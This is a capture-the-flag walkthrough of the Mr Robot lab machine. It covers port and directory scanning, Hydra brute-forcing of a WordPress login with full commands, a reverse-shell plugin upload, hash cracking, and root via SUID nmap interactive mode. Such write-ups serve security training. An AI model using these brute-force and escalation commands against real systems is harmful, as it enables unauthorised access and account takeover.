

# Mr Robot CTF
*Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?*

## Reconnaissance
Running nmap in aggressive mode we get:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -A -Pn -sV 10.10.242.93

Nmap scan report for 10.10.242.93
Host is up (0.058s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
```

At a brief inspection of the services we have:
- **Port 22**: closed SSH
- **Port 80**: HTTP Apache web server. A page welcoming us to fsociety with a lot of videos
- **Port 443**: HTTPS Apache web server. Same as above, but more secure :)

## Enumeration
With gobuster we enumerate the root finding a lot of directories:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt dir -u http://10.10.242.93 -x txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.242.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/03/21 15:11:44 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.242.93/images/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.242.93/]         
/blog                 (Status: 301) [Size: 233] [--> http://10.10.242.93/blog/]  
/rss                  (Status: 301) [Size: 0] [--> http://10.10.242.93/feed/]    
/sitemap              (Status: 200) [Size: 0]                                    
/login                (Status: 302) [Size: 0] [--> http://10.10.242.93/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.242.93/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://10.10.242.93/feed/]       
/video                (Status: 301) [Size: 234] [--> http://10.10.242.93/video/]    
/image                (Status: 301) [Size: 0] [--> http://10.10.242.93/image/]      
/atom                 (Status: 301) [Size: 0] [--> http://10.10.242.93/feed/atom/]  
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.242.93/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.242.93/admin/]     
/audio                (Status: 301) [Size: 234] [--> http://10.10.242.93/audio/]     
/intro                (Status: 200) [Size: 516314]                                   
/wp-login             (Status: 200) [Size: 2606]                                     
/wp-login.php         (Status: 200) [Size: 2664]                                     
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.242.93/feed/]        
/css                  (Status: 301) [Size: 232] [--> http://10.10.242.93/css/]       
/license              (Status: 200) [Size: 309]                                      
/license.txt          (Status: 200) [Size: 309]                                      
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.242.93/wp-includes/]
/robots.txt          (Status: 200) [Size: 309] 
```

From this scan we can see two things:
- A robots file
- A WordPress site pages
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`key-1-of-3.txt` is the first flag. `fsocity.dic` is a dictionary probably useful later.

## Hack Wordpress
### Credentials enumeration
We don't have credentials to login in WordPress, but we notice that the form tells us whether the username exists or not.<br>
It's time to bruteforce the credentials! With Hydra we can try the found dictionary. The initial one has about 850000 entries, but many are repeated, so we can cut the file with the command `fsocity.dic | uniq | sort > fsocitysortuniq.dic`.<br>
To find the username we can set a test password and try the dictionary on username field like this:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Mr_Robot_CTF]
└─$ hydra -L fsocity.dic -p test 10.10.222.127 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-22 15:58:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.222.127:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: 10.10.222.127   login: Elliot   password: test
```

After finding that the username is `Elliot` we can bruteforce the password in the same way:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Mr_Robot_CTF]
└─$ hydra -l Elliot -P ./fsocitysortunique.dic 10.10.222.127 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302" 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-22 16:11:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.10.222.127:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302
[80][http-post-form] host: 10.10.222.127   login: Elliot   password: ER28-0652
```

The password is `ER28-0652`. Now we can login into the admin panel.

### Reverse shell
In the panel there isn't much interesting, but we find a plugin upload form. Since the site is written in php, we should be able to execute an arbitrary php plugin :)<br>
Now we upload [this](php-reverse-shell.php) reverse shell as a zip and activate the plugin. On our selected port a `daemon` user shell will be waiting for us.
We can even improve it with the command `python -c 'import pty; pty.spawn("/bin/bash")'`<br>

In current directory there's nothing useful, but in `/home/robot/` we find the second key (readable only by `robot`) and password.raw-md5 = `robot:c3fcd3d76192e4007dfb496cca67e13b`.<br>
After cracking it (an online website can do the work without using hashcat or john), we get the password in clear: `abcdefghijklmnopqrstuvwxyz`.
Now: `su robot` -> `cat /home/robot/key-2-of-3.txt`

## Privilege escalation
Finding sudo privileges with `sudo -l` gives us nothing, so we try to search SUID executables with:
```
$ find / -perm /4000
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
find: '/etc/ssl/private': Permission denied
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Where's Waldo? Surely nmap is a strange executables to be SUID... With a quick google search we learn of nmap interactive mode, which lets us spawn a shell!<br>
With `nmap --interactive` we enter interactive mode, and with `!sh` we spawn a root shell! Then we can read `/root/key-3-of-3.txt` :)